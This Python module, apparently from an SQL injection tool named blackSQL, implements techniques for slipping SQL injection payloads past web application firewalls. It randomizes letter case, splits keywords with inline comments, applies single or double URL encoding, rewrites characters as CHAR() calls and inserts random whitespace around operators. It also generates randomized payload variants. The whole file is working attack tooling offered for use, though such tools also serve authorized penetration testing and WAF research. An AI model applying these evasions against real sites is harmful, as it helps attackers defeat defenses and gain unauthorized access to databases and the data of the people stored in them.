#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WAF bypass techniques for blackSQL
"""

import random
import re
from ..payloads.sql_payloads import WAF_BYPASS


class WAFBypass:
    """Class to implement WAF bypass techniques"""

    @staticmethod
    def random_case(payload):
        """
        Randomize the case of characters in a payload

        Args:
            payload (str): Original payload

        Returns:
            str: Payload with randomized case
        """
        result = ""
        for char in payload:
            if char.isalpha():
                if random.choice([True, False]):
                    result += char.upper()
                else:
                    result += char.lower()
            else:
                result += char

        return result

    @staticmethod
    def add_comments(payload):
        """
        Add comments in the payload to break pattern recognition

        Args:
            payload (str): Original payload

        Returns:
            str: Payload with comments
        """
        # Add comments for SQL keywords
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE',
                    'AND', 'OR', 'ORDER BY', 'GROUP BY']

        for keyword in keywords:
            if keyword in payload.upper():
                # Replace the keyword with commented version
                pattern = re.compile(re.escape(keyword), re.IGNORECASE)
                replacement = keyword[0] + "/**/".join(list(keyword[1:]))
                payload = pattern.sub(replacement, payload)

        return payload

    @staticmethod
    def url_encode(payload, double=False):
        """
        URL encode the payload

        Args:
            payload (str): Original payload
            double (bool): Whether to double encode

        Returns:
            str: URL encoded payload
        """
        result = ""
        for char in payload:
            if char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.~":
                result += char
            else:
                hex_char = hex(ord(char))[2:]
                if len(hex_char) < 2:
                    hex_char = "0" + hex_char
                hex_char = "%" + hex_char.upper()

                if double:
                    # Double encode
                    hex_char = "%25" + hex_char[1:]

                result += hex_char

        return result

    @staticmethod
    def char_encoding(payload):
        """
        Encode the payload using CHAR() function

        Args:
            payload (str): Original payload

        Returns:
            str: Encoded payload
        """
        result = ""
        for char in payload:
            if char in "'\"":
                # Skip quotes to avoid breaking the query
                result += char
            elif char.isalpha() or char.isdigit():
                result += f"CHAR({ord(char)})"
            else:
                result += char

        return result

    @staticmethod
    def add_whitespace(payload):
        """
        Add whitespace to break pattern recognition

        Args:
            payload (str): Original payload

        Returns:
            str: Payload with added whitespace
        """
        whitespace = [' ', '\t', '\n', '\r', '\v', '\f']

        # Add random whitespace before operators
        operators = ['=', '<', '>', '!', '+',
                     '-', '*', '/', '(', ')', ',', ';']

        result = ""
        for char in payload:
            if char in operators:
                result += random.choice(whitespace) + \
                    char + random.choice(whitespace)
            else:
                result += char

        return result

    @staticmethod
    def apply_bypass_technique(payload, technique=None):
        """
        Apply a WAF bypass technique to a payload

        Args:
            payload (str): Original payload
            technique (str, optional): Specific technique to apply

        Returns:
            str: Modified payload
        """
        techniques = {
            'random_case': WAFBypass.random_case,
            'add_comments': WAFBypass.add_comments,
            'url_encode': WAFBypass.url_encode,
            'char_encoding': WAFBypass.char_encoding,
            'add_whitespace': WAFBypass.add_whitespace
        }

        if technique and technique in techniques:
            return techniques[technique](payload)

        # Apply a random technique if none specified
        return random.choice(list(techniques.values()))(payload)

    @staticmethod
    def get_bypass_payloads(payload, count=3):
        """
        Get a list of payloads with WAF bypass techniques applied

        Args:
            payload (str): Original payload
            count (int): Number of variants to generate

        Returns:
            list: List of modified payloads
        """
        bypass_payloads = [payload]  # Include original payload

        techniques = [
            WAFBypass.random_case,
            WAFBypass.add_comments,
            WAFBypass.url_encode,
            WAFBypass.char_encoding,
            WAFBypass.add_whitespace
        ]

        for _ in range(count):
            # Apply a random technique
            technique = random.choice(techniques)
            modified_payload = technique(payload)

            # Ensure we don't add duplicates
            if modified_payload not in bypass_payloads:
                bypass_payloads.append(modified_payload)

        return bypass_payloads
